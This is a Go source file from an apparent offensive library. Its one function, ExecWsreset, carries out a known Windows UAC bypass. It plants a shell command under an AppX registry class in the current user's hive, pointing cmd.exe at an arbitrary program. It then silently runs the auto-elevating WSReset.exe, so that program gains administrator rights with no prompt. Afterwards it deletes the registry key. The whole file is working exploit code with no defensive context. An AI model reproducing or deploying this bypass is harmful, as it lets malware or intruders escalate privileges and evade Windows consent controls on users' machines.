// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package once

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func ExecWsreset(path string) error {
	k, exists, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command", registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}

	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command")
	cmdDir := filepath.Join(os.Getenv("SYSTEMROOT"), "system32", "cmd.exe")
	value := fmt.Sprintf("%s /C start %s", cmdDir, path)
	if err = k.SetStringValue("", value); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	time.Sleep(time.Second)
	e := exec.Command("WSReset.exe")
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = e.Run()
	return err
}
